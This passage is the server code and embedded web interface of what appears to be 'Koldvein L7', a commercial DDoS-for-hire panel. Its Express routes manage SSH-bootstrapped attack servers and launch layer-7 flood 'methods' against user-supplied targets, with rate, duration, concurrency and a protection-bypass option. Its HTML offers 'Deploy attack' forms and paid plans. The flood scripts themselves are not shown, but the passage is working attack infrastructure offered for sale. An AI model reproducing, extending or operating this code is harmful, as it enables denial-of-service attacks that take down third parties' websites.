    totalThreads: ready.reduce((a, s) => a + s.threads, 0),
  });
});
app.post('/api/admin/slaves', auth, admin, async (req, res) => {
  try {
    const slave = await slaves.addSlave(req.body || {});
    audit('slave_added', req.session.user.username, { id: slave.id, ip: slave.ip });
    res.status(201).json({ slave: { id: slave.id, name: slave.name, ip: slave.ip, status: slave.status } });
  } catch (e) { res.status(400).json({ error: e.message }); }
});
app.delete('/api/admin/slaves/:id', auth, admin, async (req, res) => {
  const ok = await slaves.removeSlave(req.params.id);
  if (!ok) return res.status(404).json({ error: 'Not found.' });
  audit('slave_removed', req.session.user.username, { id: req.params.id });
  res.json({ ok: true });
});
app.post('/api/admin/slaves/health', auth, admin, async (_req, res) => {
  await slaves.healthCheckAll();
  res.json({ ok: true, slaves: slaves.listSlaves() });
});

/* ---------- UPDATE SLAVE (re-bootstrap, uploads latest files) ---------- */
app.post('/api/admin/slaves/:id/update', auth, admin, async (req, res) => {
  const slaveId = req.params.id;
  const slave = slaves.getById(slaveId);
  if (!slave) return res.status(404).json({ error: 'Slave not found.' });

  const runningOnSlave = [];
  for (const s of sessions.values()) {
    if (s.status !== 'running' && s.status !== 'launching' && s.status !== 'terminating') continue;
    if ((s.slaves || []).some(x => x.slaveId === slaveId) || s.pendingSlave === slaveId) {
      runningOnSlave.push(s);
    }
  }
  if (runningOnSlave.length > 0) {
    return res.status(409).json({
      error: runningOnSlave.length + ' session(s) still running on ' + slave.name + '. Terminate them before updating.',
      runningSessions: runningOnSlave.map(s => ({ id: s.id, owner: s.owner, target: s.target })),
    });
  }

  const SL = slaves.listSlaves().find(x => x.id === slaveId);
  if (SL && SL.status === 'bootstrapping') {
    return res.status(409).json({ error: 'Slave is already bootstrapping.' });
  }

  try {
    await slaves.rebootstrapSlave(slaveId);
    audit('slave_update', req.session.user.username, { id: slaveId });
    res.json({ ok: true, message: 'Update started for ' + slave.name + '. Watch the status change to "ready".' });
  } catch (e) {
    res.status(400).json({ error: e.message });
  }
});

/* Legacy alias for repair button */
app.post('/api/admin/slaves/:id/rebootstrap', auth, admin, async (req, res) => {
  const slaveId = req.params.id;
  try {
    const slave = await slaves.rebootstrapSlave(slaveId);
    audit('slave_rebootstrap', req.session.user.username, { id: slave.id });
    res.json({ ok: true, slave: { id: slave.id, name: slave.name, status: slave.status } });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.get('/api/sessions', auth, (req, res) => {
  const isAdmin = req.session.user.role === 'admin';
  const ready = slaves.getReadySlaves();
  const busy = busySlaveIds();
  const idleSlaves = Math.max(0, ready.length - busy.size);
  const visible = Array.from(sessions.values()).filter(s => s.status !== 'terminating');
  res.json({
    sessions: visible.map(viewSession),
    slots: { total: ready.length, busy: busy.size, available: idleSlaves },
    cooldownRemaining: isAdmin ? 0 : getCooldownRemaining(req.session.user.username),
  });
});

app.post('/api/sessions', auth, async (req, res) => {
  const user = req.session.user;
  const isAdmin = user.role === 'admin';
  if (!isAdmin && user.role === 'pending') return res.status(403).json({ error: 'Buy a plan first.' });
  if (!isAdmin) {
    const cd = getCooldownRemaining(user.username);
    if (cd > 0) return res.status(429).json({ error: 'Cooldown ' + cd + 's.', cooldownRemaining: cd });
  }

  const limits = isAdmin ? unlimitedLimits() : (user.effectiveLimits || unlimitedLimits());
  const userActive = Array.from(sessions.values())
    .filter(s => (s.status === 'running' || s.status === 'launching') && s.owner === user.username).length;

  const body = req.body || {};
  const concurrent = Math.max(1, Math.min(CONFIG.maxBatch, Number(body.concurrent) || 1));

  if (!isAdmin && limits.maxConcurrent > 0) {
    const remaining = limits.maxConcurrent - userActive;
    if (concurrent > remaining) {
      return res.status(429).json({ error: 'You have ' + remaining + ' concurrent slot(s) left, requested ' + concurrent + '.' });
    }
  }

  const availableSlaves = countIdleSlaves();
  if (concurrent > availableSlaves) {
    return res.status(409).json({ error: 'Requested ' + concurrent + ' concurrent but only ' + availableSlaves + ' idle slave(s) available.' });
  }

  const methodId = String(body.method || 'koldvein');
  const method = getMethodById(methodId);
  if (!method) return res.status(400).json({ error: 'Unknown method: ' + methodId });
  const check = resolveMethodFile(method.file);
  if (!check.exists) {
    return res.status(400).json({ error: 'Method file missing on hub: ' + method.file + ' (expected at ' + check.path + ')' });
  }

  const target = String(body.target || '');
  let t; try { t = validateTarget(target); } catch (e) { return res.status(400).json({ error: e.message }); }
  if (isBlacklisted(t.host)) return res.status(403).json({ error: 'Target blacklisted.' });

  const d = Number(body.duration);
  if (!Number.isInteger(d) || d < 1) return res.status(400).json({ error: 'Invalid duration.' });
  if (!isAdmin && limits.maxDuration > 0 && d > limits.maxDuration) return res.status(400).json({ error: 'Max duration ' + limits.maxDuration + 's.' });
  const r = Number(body.rate);
  if (!Number.isInteger(r) || r < 1) return res.status(400).json({ error: 'Invalid rate.' });
  if (!isAdmin && limits.maxRate > 0 && r > limits.maxRate) return res.status(400).json({ error: 'Rate must be 1-' + limits.maxRate + '.' });

  const bypass  = !!body.bypass;
  const cookies = !!body.cookies;
  const headers = !!body.headers;
  const cache   = !!body.cache;

  const batchId = crypto.randomBytes(8).toString('hex');
  const created = [];

  for (let i = 0; i < concurrent; i++) {
    const slave = pickSlaveForSession();
    if (!slave) break;

    const id = crypto.randomUUID();
    const threads = slave.cores * slaves.THREADS_PER_CORE;

    const args = method.buildArgs({
      target: t.url, duration: d, threads, rate: r,
      bypass, cookies, headers, cache,
    });

    const command = 'node ' + method.file + ' ' + args.join(' ');

    const sessionObj = {
      id, target: t.host, duration: d, rate: r,
      bypass, cookies, headers, cache,
      method: method.id, methodName: method.name,
      startedAt: Date.now(), status: 'launching',
      owner: user.username,
      slaves: [],
      pendingSlave: slave.id,
      concurrent: concurrent,
      batchId,
      command,
    };
    sessions.set(id, sessionObj);
    created.push(sessionObj);

    setImmediate(async () => {
      try {
        const result = await slaves.launchOnSlave(slave.id, {
          methodFile: method.file,
          args,
        });
        sessionObj.slaves = [result];
        sessionObj.startedAt = Date.now();
        sessionObj.status = 'running';
        delete sessionObj.pendingSlave;
        sessionObj.timer = setTimeout(() => stopSession(id, 'duration_expired'), d * 1000);
        sessionObj.timer.unref();
        startLivenessPoller(id);
        persistSessions();
        audit('process_started', user.username, {
          id, method: method.id, target: t.host, duration: d, rate: r,
          threads, slaveId: slave.id, batchId,
        });
      } catch (e) {
        sessionObj.status = 'failed';
        sessionObj.error = String(e.message || e).slice(0, 400);
        delete sessionObj.pendingSlave;
        persistSessions();
        audit('process_launch_failed', user.username, { id, error: sessionObj.error });
        setTimeout(() => { sessions.delete(id); persistSessions(); }, 30000).unref();
      }
    });
  }

  if (created.length === 0) {
    return res.status(409).json({ error: 'No idle slaves available.' });
  }

  created.forEach(s => { s.concurrent = created.length; });

  persistSessions();
  res.status(201).json({ sessions: created.map(viewSession), count: created.length, batchId, requested: concurrent });
});

app.delete('/api/sessions/:id', auth, (req, res) => {
  const s = sessions.get(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not running.' });
  const isAdmin = req.session.user.role === 'admin';
  const isOwner = s.owner === req.session.user.username;
  if (!isAdmin && !isOwner) return res.status(403).json({ error: 'Not yours.' });
  if (s.status === 'terminating') return res.json({ ok: true, alreadyStopping: true });
  res.json({ ok: true });
  setImmediate(() => stopSession(s.id, isAdmin && !isOwner ? 'admin_force' : 'manual'));
});

app.post('/api/tools/ping', auth, async (req, res) => {
  const host = normalizeHost((req.body || {}).host);
  if (!host) return res.status(400).json({ error: 'Host required.' });
  if (!/^[a-z0-9.\-:]+$/i.test(host)) return res.status(400).json({ error: 'Invalid host.' });
  try { res.json(await runServerPing(host)); } catch (e) { res.status(500).json({ error: e.message }); }
});
app.post('/api/tools/https', auth, async (req, res) => {
  const host = normalizeHost((req.body || {}).host);
  if (!host) return res.status(400).json({ error: 'Host required.' });
  try { res.json(await checkHttpsUrl(host, 8000)); } catch (e) { res.status(500).json({ error: e.message }); }
});
app.post('/api/tools/asn', auth, async (req, res) => {
  const host = normalizeHost((req.body || {}).host);
  if (!host) return res.status(400).json({ error: 'Host required.' });
  try {
    const geo = await httpGetJson('http://ip-api.com/json/' + encodeURIComponent(host) +
      '?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query,reverse,mobile,proxy,hosting', 8000);
    if (!geo || geo.status !== 'success') return res.status(404).json({ error: 'Lookup failed.' });
    const asNum = (geo.as || '').split(' ')[0] || '';
    res.json({
      host, ip: geo.query, country: geo.country, countryCode: geo.countryCode,
      region: geo.regionName, city: geo.city, zip: geo.zip, lat: geo.lat, lon: geo.lon,
      timezone: geo.timezone, isp: geo.isp, org: geo.org, asn: asNum,
      asName: geo.asname || (geo.as || '').replace(asNum, '').trim(),
      reverse: geo.reverse || '',
      flags: { mobile: !!geo.mobile, proxy: !!geo.proxy, hosting: !!geo.hosting },
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

const HTML = String.raw`<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="theme-color" content="#050609">
<title>Koldvein L7</title>
<link rel="icon" type="image/png" href="/fav.png">
<link rel="shortcut icon" type="image/png" href="/fav.png">
<link rel="apple-touch-icon" href="/fav.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="/ui.css?v=13">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
</head><body>
<div class="ambient-glows"><div class="glow-orb orb-1"></div><div class="glow-orb orb-2"></div></div>
<div id="app">
<aside id="sidebar">
  <div class="sidebar-brand"><span class="brand-dot"></span><div><b>KOLDVEIN</b><small>L7</small></div></div>
  <nav class="sidebar-nav">
    <button data-page="hub" class="active">Hub</button>
    <button data-page="plans">Buy Plans</button>
    <button data-page="settings">Settings</button>
    <button data-page="tools">Tools</button>
    <div class="sidebar-divider"></div>
    <button data-page="login" id="navLogin">Login</button>
    <button data-page="register" id="navRegister">Sign Up</button>
    <button id="navLogout" class="hide">Logout</button>
    <div class="sidebar-divider"></div>
    <a href="https://t.me/privflood" target="_blank" rel="noopener">Contact</a>
  </nav>
  <small class="sidebar-footer">KOLDVEIN L7</small>
</aside>
<div id="sidebarBackdrop" class="hide"></div>
<div class="content-wrap">
<header id="appHeader">
  <button id="menu">☰</button>
  <div class="brand"><span class="brand-dot"></span><div><b>KOLDVEIN</b><small>L7</small></div></div>
  <div style="width:40px"></div>
</header>
<main>

<section id="login" class="panel login hide">
  <div class="login-badge">SECURE ACCESS</div>
  <h1>Welcome back.</h1>
  <p>New here? <a href="#" id="toRegisterLink">Create an account</a>.</p>
  <form id="loginForm">
    <label>Username<input name="username" autocomplete="username" required></label>
    <label>Password<input name="password" type="password" autocomplete="current-password" required></label>
    <label>Human verification
      <div class="captcha-row">
        <span class="captcha-q" id="loginCaptchaQuestion">…</span>
        <button type="button" id="loginCaptchaRefresh" class="captcha-refresh" aria-label="New captcha">↻</button>
      </div>
      <input name="captchaAnswer" type="number" placeholder="Enter the sum" required autocomplete="off" style="margin-top:8px;">
    </label>
    <button class="primary" id="loginBtn" type="submit">Authenticate <span>→</span></button>
    <p id="loginErr" class="err"></p>
  </form>
</section>

<section id="register" class="panel login hide">
  <div class="login-badge">CREATE ACCOUNT</div>
  <h1>Join.</h1>
  <p>Already in? <a href="#" id="toLoginLink">Sign in</a>.</p>
  <form id="registerForm">
    <label>Username<input name="username" required minlength="3" maxlength="32"></label>
    <label>Password<input name="password" type="password" required minlength="3"></label>
    <label>Human verification
      <div class="captcha-row">
        <span class="captcha-q" id="captchaQuestion">…</span>
        <button type="button" id="captchaRefresh" class="captcha-refresh" aria-label="New captcha">↻</button>
      </div>
      <input name="captchaAnswer" type="number" placeholder="Enter the sum" required autocomplete="off" style="margin-top:8px;">
    </label>
    <button class="primary" id="registerBtn" type="submit">Create account <span>→</span></button>
    <p id="registerErr" class="err"></p>
  </form>
</section>

<section id="hub" class="hide">
  <div class="intro"><small class="eyebrow">ATTACK HUB</small>
    <h1 class="hero-title">Welcome to <span class="gradient-text">Koldvein L7</span></h1>
    <p>Distributed L7 cluster — every session runs on a live slave.</p></div>
  <div class="stats">
    <div class="stat"><div class="stat-head"><small>SLOTS</small></div>
      <b id="slotLine">—</b><span id="slotDetail">sign in</span></div>
    <div class="stat"><div class="stat-head"><small>YOUR ROLE</small></div>
      <b id="role">Guest</b><span id="limitsLine">Sign in to deploy</span></div>
  </div>
  <div class="panel"><small class="eyebrow">NEW PROCESS</small>
    <h2>Deploy attack</h2>
    <form id="launch" autocomplete="off">
      <label>Method
        <select name="method" id="methodSelect" required>
          <option value="koldvein">Koldvein-Bypass</option>
          <option value="cflood">C-Flood</option>
        </select>
        <small id="methodHint" style="display:block;margin-top:6px;color:var(--muted);font-size:10.5px;"></small>
      </label>
      <label>Target URL <small>HTTPS · any non-blacklisted hostname</small>
        <div class="url"><span>https://</span><input name="target" id="targetInput" placeholder="target.com" required></div></label>
      <div class="cols">
        <label>Duration · seconds<input name="duration" id="durationInput" type="number" value="60" min="1" required></label>
        <label>Concurrent<input name="concurrent" id="concurrentInput" type="number" value="1" min="1" required></label>
      </div>
      <label>Rate <small>64-128 recommended</small>
        <input name="rate" id="rateInput" type="number" value="64" min="1" placeholder="64-128" required></label>
      <div class="flags">
        <div id="flagsKoldvein" class="flag-group">
          <label class="flag-item"><input type="checkbox" id="bypassInput"> ArvanCloud Bypass <small>(-bypass)</small></label>
          <label class="flag-item"><input type="checkbox" id="cookiesInput" checked> Smart Cookies <small>(-c)</small></label>
        </div>
        <div id="flagsCflood" class="flag-group hide">
          <label class="flag-item"><input type="checkbox" id="cfloodCookiesInput" checked> Cookies <small>(-c)</small></label>
          <label class="flag-item"><input type="checkbox" id="cfloodHeadersInput"> Full Headers <small>(-h)</small></label>
          <label class="flag-item"><input type="checkbox" id="cfloodCacheInput"> Cache Control <small>(-ch true)</small></label>
        </div>
      </div>
      <div id="cooldownNotice" class="notice hide" style="background:rgba(244,63,94,.08);border-color:rgba(244,63,94,.3);">
        <div class="notice-label" style="color:var(--danger);">Cooldown active</div>
        <span id="cooldownText"></span></div>
      <button class="primary" id="startBtn" type="submit">Deploy <span>→</span></button>
      <p id="launchErr" class="err"></p>
    </form>
  </div>
  <div class="headrow"><h2>Live sessions</h2><button id="refresh" class="subtle" type="button">Sync</button></div>
  <div id="sessions"></div>
</section>

<section id="plans" class="hide">
  <div class="intro"><small class="eyebrow">PLANS / PAYMENT</small>
    <h1 class="hero-title">Get <span class="gradient-text">access.</span></h1>
    <p>USDT TRC20 global or Donito Iran — auto-delivered.</p></div>
  <div id="pendingOrderBanner" class="pending-banner hide"></div>
  <div id="plansList"></div>
  <div id="planOrder" class="panel hide">
    <small class="eyebrow" id="planOrderEyebrow">COMPLETE PAYMENT</small>
    <h2 id="planOrderTitle">Send payment</h2>
    <div id="planOrderSteps" class="notice" style="background:rgba(34,197,94,.05);border-color:rgba(34,197,94,.25);">
      <div class="notice-label" style="color:var(--success);" id="planOrderStepsLabel">Follow</div>
      <ol id="planOrderStepsList" style="margin:6px 0 0 18px;padding:0;line-height:1.9;"></ol>
    </div>
    <div class="notice" style="background:rgba(56,189,248,.06);border-color:rgba(56,189,248,.3);">
      <div class="notice-label" style="color:var(--accent-cyan);" id="planAmountLabel">Amount</div>
      <code id="planPayAmount" style="font-size:17px;">—</code>
      <button class="subtle" id="copyAmountBtn" type="button" style="width:100%;margin-top:8px;">Copy amount</button>
    </div>
    <div id="planWalletBlock">
      <label>Wallet (TRC20)<div class="url"><input id="planWallet" readonly style="font-family:monospace;"></div></label>
      <button class="subtle" id="copyWalletBtn" type="button" style="width:100%;margin-bottom:12px;">Copy wallet</button>
    </div>
    <div id="planDonitoBlock" class="hide">
      <button class="primary" id="openDonitoBtn" type="button">Open Donito <span>→</span></button>
    </div>
    <div class="notice" style="margin-top:16px;"><div class="notice-label" id="planStatusLabel">Order status</div>
      <span id="planOrderStatus">Waiting…</span></div>
    <button class="subtle" id="checkOrderBtn" type="button" style="width:100%;margin-top:8px;">Check now</button>
    <button class="subtle" id="cancelOrderBtn" type="button" style="width:100%;margin-top:8px;">Cancel</button>
  </div>
  <div id="planHistory" class="panel hide"><small class="eyebrow">HISTORY</small><h2>Your orders</h2>
    <div id="planHistoryList"></div></div>
</section>

<section id="settings" class="hide">
  <div class="intro"><small class="eyebrow">SETTINGS</small>
    <h1 class="hero-title">Account.</h1><p>Credentials, admin, slaves.</p></div>
  <div class="settings-partition">
    <div class="partition-header">Security & Credentials</div>
    <div class="panel"><small class="eyebrow">CREDENTIALS</small><h2>Update account</h2>
      <form id="account">
        <label>Current password<input type="password" name="currentPassword" required></label>
        <label>New username<input name="newUsername" placeholder="leave blank"></label>
        <label>New password<input type="password" name="newPassword" minlength="3"></label>
        <button class="primary" type="submit">Save <span>→</span></button>
        <p id="accountMsg"></p>
      </form></div>
  </div>
  <div id="admin" class="panel hide settings-partition">
    <div class="partition-header">Operator Management</div>
    <small class="eyebrow">ADMIN</small><h2>Create operator</h2>
    <p style="font-size:12px;color:var(--muted);">0 = unlimited. Expiry: <code>7d</code>, <code>30d</code>, ISO date, or blank = never.</p>
    <form id="createUser">
      <label>Username<input name="username" required minlength="3" maxlength="32"></label>
      <label>Password<input name="password" type="password" required minlength="3"></label>
      <div class="cols">
        <label>Max duration · s<input type="number" name="maxDuration" value="0" min="0"></label>
        <label>Max rate<input type="number" name="maxRate" value="0" min="0"></label>
      </div>
      <div class="cols">
        <label>Max concurrent<input type="number" name="maxConcurrent" value="0" min="0"></label>
        <label>Cooldown · s<input type="number" name="cooldown" value="20" min="0"></label>
      </div>
      <div class="cols">
        <label>Expires in<input name="expiresAt" placeholder="7d / blank"></label>
        <label>Role<select name="role"><option value="user">user</option><option value="pending">pending</option><option value="admin">admin</option></select></label>
      </div>
      <button class="primary" type="submit">Create <span>+</span></button>
      <p id="userMsg"></p>
    </form>
    <div id="users"></div>
  </div>
  <div id="adminGlobalLimits" class="panel hide settings-partition">
    <div class="partition-header">Global Limits</div>
    <small class="eyebrow">ADMIN</small><h2>Global rate cap</h2>
    <p style="font-size:12px;color:var(--muted);">Lower of plan rate vs this cap wins. 0 = no cap.</p>
    <form id="globalLimitsForm">
      <label>Global max rate<input type="number" name="maxRate" id="globalMaxRate" value="0" min="0"></label>
      <button class="primary" type="submit">Save</button>
      <p id="globalLimitsMsg"></p>
    </form>
  </div>
  <div id="adminBlacklist" class="panel hide settings-partition">
    <div class="partition-header">Target Blacklist</div>
    <small class="eyebrow">ADMIN</small><h2>Blocked targets</h2>
    <form id="addBlacklist">
      <label>Host / URL<input name="pattern" placeholder="example.com · *.example.com" required></label>
      <button class="primary" type="submit">Add <span>+</span></button>
      <p id="blacklistMsg"></p>
    </form>
    <div id="blacklistList"></div>
  </div>
  <div id="adminSlaves" class="panel hide settings-partition">
    <div class="partition-header">Execution Slaves</div>
    <small class="eyebrow">ADMIN</small><h2>Koldvein slaves</h2>
    <p style="font-size:12px;color:var(--muted);">Each slave contributes cores × 8 threads. Files uploaded via SFTP. Use <b>Update</b> after adding new scripts to refresh the slave.</p>
    <div id="slavesList"></div>
    <div style="display:flex;gap:8px;margin:16px 0;">
      <button class="subtle" id="refreshSlavesBtn" type="button" style="flex:1;">Refresh health</button>
    </div>
    <small class="eyebrow">ADD SLAVE</small>
    <form id="addSlaveForm" autocomplete="off">
      <div class="cols">
        <label>Name<input name="name" placeholder="kold-1" required></label>
        <label>IP / Host<input name="ip" placeholder="1.2.3.4" required></label>
      </div>
      <div class="cols">
        <label>SSH port<input name="port" type="number" value="22"></label>
        <label>User<input name="username" value="root" required></label>
      </div>
      <label>Auth
        <select name="authType" id="authTypeSelect">
          <option value="password">Password</option>
          <option value="key">Private Key</option>
        </select>
      </label>
      <div id="passwordField">
        <label>Password<input name="password" type="password" id="passwordInput"></label>
      </div>
      <div id="keyField" class="hide">
        <label>Private Key<textarea name="privateKey" id="keyInput" rows="6" style="width:100%;background:rgba(10,13,20,.5);border:1px solid var(--panel-border);color:var(--text);padding:13px 15px;border-radius:10px;font-family:monospace;font-size:12px;"></textarea></label>
        <label>Passphrase <small>(optional)</small><input name="passphrase" type="password" id="passphraseInput"></label>
      </div>
      <button class="primary" type="submit">Add & Bootstrap <span>+</span></button>
      <p id="addSlaveMsg"></p>
    </form>
  </div>
</section>

<section id="tools" class="hide">
  <div class="intro"><small class="eyebrow">UTILITIES</small>
    <h1 class="hero-title">Tools.</h1><p>Network diagnostics and reachability checks.</p></div>
  <div class="panel" style="padding:12px;">
    <button class="tool-btn" id="toolPingBtn" type="button">
      <span class="tool-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></span>
      <span class="tool-text"><b>Ping</b><small>TCP probe latency test</small></span>
      <span class="tool-arrow">→</span>
    </button>
    <button class="tool-btn" id="toolHttpsBtn" type="button">
      <span class="tool-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>
      <span class="tool-text"><b>HTTPS Status</b><small>Check if a site is online</small></span>
      <span class="tool-arrow">→</span>
    </button>
    <button class="tool-btn" id="toolAsnBtn" type="button">
      <span class="tool-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></span>
      <span class="tool-text"><b>ASN Lookup</b><small>Owner org, ASN, geo of any host</small></span>
      <span class="tool-arrow">→</span>
    </button>
  </div>
  <div id="toolPing" class="panel hide"><small class="eyebrow">PING</small><h2>TCP latency</h2>
    <label>Host<input id="pingHost" placeholder="example.com"></label>
    <button class="primary" id="pingRunBtn" type="button">Run <span>→</span></button>
    <div class="tool-output" id="pingOutput"></div></div>
  <div id="toolHttps" class="panel hide"><small class="eyebrow">HTTPS</small><h2>Reachability</h2>
    <label>URL<div class="url"><span>https://</span><input id="httpsHost" placeholder="example.com"></div></label>
    <button class="primary" id="httpsRunBtn" type="button">Check <span>→</span></button>
    <div class="tool-output" id="httpsOutput"></div></div>
  <div id="toolAsn" class="panel hide"><small class="eyebrow">ASN</small><h2>Network origin</h2>
    <label>Host<div class="url"><span>https://</span><input id="asnHost" placeholder="example.com"></div></label>
    <button class="primary" id="asnRunBtn" type="button">Lookup <span>→</span></button>
    <div class="tool-output" id="asnOutput"></div></div>
</section>

</main></div>
<div id="toast" class="hide"></div>
</div>
<script src="/ui.js?v=13" defer></script>
</body></html>`;

const UI_CSS = String.raw`
:root{color-scheme:dark;--bg:#050609;--panel:rgba(18,22,33,.72);--panel-border:rgba(255,255,255,.07);--text:#f1f5f9;--text-secondary:#94a3b8;--muted:#64748b;--dim:#334155;--accent-cyan:#38bdf8;--accent-grad:linear-gradient(135deg,#38bdf8 0%,#818cf8 50%,#c084fc 100%);--danger:#f43f5e;--success:#22c55e;--warn:#f59e0b;--radius:20px;--radius-sm:14px;--radius-xs:10px}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;font-size:15px;line-height:1.55;-webkit-font-smoothing:antialiased;min-height:100vh;overflow-x:hidden}
.ambient-glows{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
.glow-orb{position:absolute;border-radius:50%;filter:blur(120px);opacity:.18}
.orb-1{top:-15%;left:15%;width:600px;height:600px;background:radial-gradient(circle,#38bdf8,transparent 70%)}
.orb-2{bottom:-15%;right:10%;width:700px;height:700px;background:radial-gradient(circle,#818cf8,transparent 70%)}
body::after{content:"";position:fixed;inset:0;background-image:radial-gradient(rgba(255,255,255,.02) 1px,transparent 1px);background-size:32px 32px;pointer-events:none;z-index:0}
button,input,select,textarea{font:inherit}
button{cursor:pointer;color:inherit;border:0;background:transparent}
.hide{display:none!important}
a{color:var(--accent-cyan);text-decoration:none}
input::placeholder{color:var(--dim)}
#sidebar{position:fixed;top:0;left:0;bottom:0;width:240px;background:rgba(5,7,14,.94);backdrop-filter:blur(30px);border-right:1px solid var(--panel-border);padding:22px 14px;z-index:25;display:flex;flex-direction:column;gap:4px;transition:transform .3s}
.sidebar-brand{display:flex;align-items:center;gap:12px;padding:4px 12px 20px;border-bottom:1px solid var(--panel-border);margin-bottom:12px;font-size:11px;letter-spacing:.18em;font-weight:700}
.sidebar-brand b{display:block;color:var(--text);font-size:13px;line-height:1}
.sidebar-brand small{display:block;color:var(--muted);font-size:9px;margin-top:2px}
.brand-dot{width:8px;height:8px;border-radius:50%;background:var(--accent-grad);box-shadow:0 0 14px rgba(56,189,248,.8);flex-shrink:0}
.sidebar-nav{display:flex;flex-direction:column;gap:3px}
.sidebar-nav button,.sidebar-nav a{background:transparent;border:0;color:var(--text-secondary);text-align:left;padding:11px 14px;border-radius:11px;font-size:13.5px;text-decoration:none;display:flex;align-items:center;gap:12px;font-weight:600;width:100%}
.sidebar-nav button:hover,.sidebar-nav a:hover{background:rgba(56,189,248,.08);color:var(--accent-cyan)}
.sidebar-nav button.active{background:linear-gradient(135deg,rgba(56,189,248,.15),rgba(192,132,252,.12));color:var(--text);border:1px solid rgba(56,189,248,.25)}
.sidebar-divider{height:1px;background:var(--panel-border);margin:8px 12px}
.sidebar-footer{margin-top:auto;color:var(--muted);font-size:9.5px;padding:12px;letter-spacing:.3em;text-align:center}
#sidebarBackdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);z-index:24}
@media (max-width:900px){#sidebar{transform:translateX(-100%)}#sidebar.open{transform:translateX(0);box-shadow:0 0 60px rgba(0,0,0,.8)}}
@media (min-width:901px){#sidebarBackdrop{display:none!important}}
.content-wrap{margin-left:240px}
@media (max-width:900px){.content-wrap{margin-left:0}}
@media (min-width:901px){#appHeader{display:none}}
header{height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 22px;position:sticky;top:0;z-index:10;background:rgba(5,6,9,.7);backdrop-filter:blur(24px);border-bottom:1px solid var(--panel-border)}
header button{background:rgba(255,255,255,.04);border:1px solid var(--panel-border);color:var(--text);display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:12px}
.brand{display:flex;align-items:center;gap:12px;font-size:11px;letter-spacing:.18em;font-weight:700}
main{position:relative;z-index:1;width:min(100% - 32px,760px);margin:28px auto 120px}
.panel{background:var(--panel);border:1px solid var(--panel-border);border-radius:var(--radius);padding:24px;margin-bottom:18px;backdrop-filter:blur(30px);box-shadow:0 16px 40px rgba(0,0,0,.5)}
.login{max-width:440px;margin:6vh auto;text-align:center;padding:36px 28px}
.login-badge{display:inline-block;padding:5px 12px;background:rgba(56,189,248,.1);border:1px solid rgba(56,189,248,.25);border-radius:20px;font-size:10px;font-weight:800;letter-spacing:.2em;color:var(--accent-cyan);margin-bottom:14px}
.eyebrow{font-size:10px;letter-spacing:.22em;color:var(--accent-cyan);font-weight:800;text-transform:uppercase;display:inline-block}
.intro{padding:4px 4px 22px}
.hero-title,.intro h1,.login h1{font-size:clamp(30px,7vw,40px);line-height:1.4;letter-spacing:-.035em;margin:10px 0;font-weight:800;padding:4px 0 10px;overflow:visible;display:block}
.gradient-text{display:inline-block;line-height:inherit;padding:0 2px 8px;margin-bottom:-8px;background:var(--accent-grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;color:transparent}
@supports not ((-webkit-background-clip: text) or (background-clip: text)){.gradient-text{background:none;-webkit-text-fill-color:var(--accent-cyan);color:var(--accent-cyan)}}
.intro p,.login p{font-size:13.5px;color:var(--text-secondary);margin:8px 0 0}
.captcha-row{display:flex;align-items:center;justify-content:space-between;gap:12px;background:rgba(10,13,20,.5);border:1px solid var(--panel-border);border-radius:var(--radius-xs);padding:12px 15px;margin-top:8px}
.captcha-q{font-family:ui-monospace,Menlo,monospace;font-size:18px;font-weight:700;color:var(--accent-cyan)}
.captcha-refresh{background:rgba(255,255,255,.04);border:1px solid var(--panel-border);color:var(--text-secondary);width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px;cursor:pointer}
.captcha-refresh:hover{border-color:rgba(56,189,248,.5);color:var(--accent-cyan)}
.settings-partition{background:rgba(18,22,34,.45);border:1px solid rgba(255,255,255,.06);border-radius:24px;padding:20px;margin-bottom:20px}
.partition-header{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:var(--accent-cyan);margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--panel-border)}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px}
.stat{background:var(--panel);border:1px solid var(--panel-border);border-radius:var(--radius-sm);padding:14px 16px}
.stat-head{display:flex;justify-content:space-between;margin-bottom:4px}
.stat-head small{color:var(--muted);font-size:9.5px;letter-spacing:.16em;font-weight:700}
.stat b{display:block;font-size:20px;font-weight:800;line-height:1.2;margin-bottom:2px}
